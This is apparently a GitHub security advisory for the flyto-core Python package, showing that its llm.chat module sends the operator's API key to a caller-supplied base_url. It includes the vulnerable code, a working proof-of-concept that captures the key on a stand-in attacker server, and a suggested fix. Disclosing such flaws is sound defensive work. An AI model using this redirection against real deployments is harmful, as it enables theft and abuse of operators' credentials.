# [H] Flyto2 Core: LLM/API keys leak to an attacker-controlled base_url

## Summary
Severity: High
Advisory: GHSA-qq9q-xgm3-xv9g
CVE: CVE-2026-67425
CWE: CWE-201, CWE-522
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-qq9q-xgm3-xv9g
Type: github-advisory

## Affected
- PyPI: `flyto-core` — affected >=0 <2.26.7

## Details
## Summary

`llm.chat` reads the operator's provider key from the environment (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, ...) and sends it in the `Authorization: Bearer` header to `base_url`, a parameter the caller controls. `base_url` is only checked against the SSRF guard, and the guard allows any public host, so pointing `base_url` at an attacker's server hands them the operator's key. flyto-core's own bounty scale rates "environment access exposing secrets (e.g. `ANTHROPIC_API_KEY`)" as High.

## Affected code

`src/core/modules/atomic/llm/chat.py` (`_call_openai`):

```python
base_url = params.get('base_url')            # caller-controlled
if base_url:
    validate_url_with_env_config(base_url)    # SSRF check only; a public attacker host passes
if not api_key:
    api_key = os.getenv('OPENAI_API_KEY')     # operator's key
...
url = (base_url or "https://api.openai.com/v1").rstrip('/') + "/chat/completions"
headers = {"Authorization": f"Bearer {api_key}"}
await client.post(url, headers=headers, json=payload)   # sent to base_url
```

The same wiring (env key plus caller endpoint) exists in `ai.model` (which does not even SSRF-check `base_url`), `llm.agent`, and `vector.connector` (`QDRANT_API_KEY` with a caller `url`). The SSRF guard is the wrong control here: it stops private targets but does nothing about the key being sent to an attacker's public host.

## Reproduction

Save as `keyexfil_poc.py`, run with `PYTHONPATH=src/src python keyexfil_poc.py`. It sets an operator key in the environment and points `base_url` at a local capture server.

```python
#!/usr/bin/env python3
import asyncio
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

os.environ["OPENAI_API_KEY"] = "sk-OPERATOR-SECRET-doNotLeak-9f8e7d6c5b4a"
os.environ["FLYTO_ALLOWED_HOSTS"] = "localhost"   # stand-in for the attacker's public host
CAPTURED = {}

class Attacker(BaseHTTPRequestHandler):
    def do_POST(self):
        CAPTURED["auth"] = self.headers.get("Authorization")
        ln = int(self.headers.get("Content-Length", 0)); self.rfile.read(ln)
        b = b'{"choices":[{"message":{"content":"pwned"},"finish_reason":"stop"}],"usage":{"total_tokens":1}}'
        self.send_response(200); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def log_message(self, *a): pass

async def main():
    from core.modules.atomic import register_all
    from core.modules.registry import ModuleRegistry
    register_all()
    threading.Thread(target=HTTPServer(("127.0.0.1", 8080), Attacker).serve_forever, daemon=True).start()
    res = await ModuleRegistry.execute("llm.chat", params={
        "prompt": "hi", "provider": "openai", "base_url": "http://localhost:8080",
    }, context={})
    print("module ok:", res.get("ok"))
    print("Authorization received by attacker:", CAPTURED.get("auth"))

if __name__ == "__main__":
    asyncio.run(main())
```

Output:

```
module ok: True
Authorization received by attacker: Bearer sk-OPERATOR-SECRET-doNotLeak-9f8e7d6c5b4a
```

Confirmed against the running API as well: calling `llm.chat` with `base_url=https://example.com` was not blocked by the SSRF guard, so the request egressed to the public host with the operator key attached.

## Impact

Theft of the operator's cloud LLM / vector-DB keys, which lets the attacker bill and abuse those accounts and reach data available to the key. The caller only needs to influence `base_url`, which is reachable through the MCP agent surface or the hosted API.

## Suggested fix

Only use the environment-derived key with the provider's official endpoint. If the caller supplies a custom `base_url`, require them to supply the `api_key` explicitly too, or check `base_url` against an allowlist of trusted endpoints — never auto-attach the operator's secret to an arbitrary host. Apply the same to `ai.model`, `llm.agent` and `vector.connector`, and add SSRF validation to `ai.model`'s `base_url`.

## References
- https://github.com/flytohub/flyto-core/security/advisories/GHSA-qq9q-xgm3-xv9g
- https://nvd.nist.gov/vuln/detail/CVE-2026-67425
- https://github.com/flytohub/flyto-core/commit/d5f89d71303e3c1e6418d347c5c55fcd173cc8cc
- https://github.com/flytohub/flyto-core
- https://github.com/flytohub/flyto-core/releases/tag/v2.26.6
